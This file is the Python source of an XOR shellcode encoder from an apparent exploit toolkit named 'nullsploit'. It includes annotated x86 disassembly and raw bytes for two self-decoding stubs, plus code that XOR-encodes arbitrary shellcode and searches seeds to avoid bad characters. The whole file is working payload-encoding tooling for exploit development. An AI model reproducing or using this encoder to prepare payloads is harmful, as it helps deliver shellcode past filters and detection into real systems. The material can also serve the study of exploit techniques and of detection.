#!/usr/bin/env python
"""
    nullsploit :: XOR encoder

    AUTHOR :: TheXero
    WEBSITE :: www.nullsecurity.net
    
ECX = end of shellcode
EAX = start of shellcode
stub8
004040C0     33C9           XOR ECX,ECX                              ;  Zero ECX
004040C2     B1 FF          MOV CL,FF                                ;  Length of shellcode
004040C4     E8 FFFFFF      CALL Program.004040C8                    ;  Push EIP
004040C8     FFC1           INC ECX                                  ;  Increase ECX to full length of shellcode
             37             AAA                                      ;  NOP equivilent (number 7)
004040CA     58             POP EAX                                  ;  Get EIP
004040CB     03C8           ADD ECX,EAX                              ;  Add EAX to ECX
004040CD     8070 0E 0F     XOR BYTE PTR DS:[EAX+E],0F               ;  XOR the value of EAX + 0E
004040D1     40             INC EAX                                  ;  Increase the address
004040D2     3BC1           CMP EAX,ECX                              ;  Have we reached the end of the shellcode?
004040D4    ^75 F7          JNZ SHORT Program.004040CD               ;  If not, jump back to the XOR

33 C9 B1 FF E8 FF FF FF FF C1 37 58 03 C8 80 70 0E 0F 40 3B C1 75 F7

stub16
025FFC2D   33C9             XOR ECX,ECX
025FFC2F   66:B9 FF00       MOV CX,0FF
025FFC33   E8 FFFFFFFF      CALL 025FFC37
025FFC37   FFC1             INC ECX
025FFC39   90               NOP
025FFC3A   58               POP EAX
025FFC3B   03C8             ADD ECX,EAX
025FFC3D   8070 0E 0F       XOR BYTE PTR DS:[EAX+E],0F
025FFC41   40               INC EAX
025FFC42   3BC1             CMP EAX,ECX
025FFC44  ^75 F7            JNZ SHORT 025FFC3D

33 C9 66 B9 FF 00 E8 FF FF FF FF C1 90 58 03 C8 80 70 0E 0F 40 3B C1 75 F7

"""
from struct import pack
from exploitutils import *

def encoder(shellcode, seed):
    
    encoded_shellcode = bytearray(shellcode)
    for i in range (len(shellcode)):
        encoded_shellcode[i] ^= seed
        
    return encoded_shellcode

def stub8(length, seed):
    
    stub="\x33\xC9\xB1%s\xE8\xFF\xFF\xFF\xFF\xC1\x90\x58\x03\xC8\x80\x70\x0E%s\x40\x3B\xC1\x75\xF7" % (chr(length), chr(seed))
    return stub

def stub16(length, seed):
    
    stub="\x33\xC9\x66\xB9%s\xE8\xFF\xFF\xFF\xFF\xC1\x90\x58\x03\xC8\x80\x70\x0E%s\x40\x3B\xC1\x75\xF7" % (pack('<h',length), chr(seed))
    return stub

def detect_badchar(shellcode, badchars):

    array = []
    for badchar in badchars:
        array.append(badchar)
        for i in array:
            if i in shellcode:
                return False
    return True    

def generate(shellcode, badchars):
    seed = 0x00
    if len(shellcode) < 256:      
        new_shellcode = stub8(len(shellcode), seed)
        new_shellcode+= encoder(shellcode, seed)         
        for char in new_shellcode:
            result = detect_badchar(new_shellcode, badchars)
            if result == True:
                break
            else:
                if seed != 0xff:
                    seed+=1
                else:
                    print_bad("Encoding failed")
                    exit()
            new_shellcode = stub8(len(shellcode), seed)
            new_shellcode+= encoder(shellcode, seed)    
            
        #print_update("Shellcode length: %s" % len(new_shellcode))
        return new_shellcode
    elif len(shellcode) < 65535:
        new_shellcode = stub16(len(shellcode), seed)
        new_shellcode+= encoder(shellcode, seed)         
        for char in new_shellcode:
            result = detect_badchar(new_shellcode, badchars)
            if result == True:
                break
            else:
                if seed != 0xff:
                    seed+=1
                else:
                    print_bad("Encoding failed!")
                    exit()
            new_shellcode = stub16(len(shellcode), seed)
            new_shellcode+= encoder(shellcode, seed)                              
                    
        #print_status("Shellcode length: %s" % len(new_shellcode))
        return new_shellcode    
    else:
        print_bad("Shellcode too large!")
        exit()
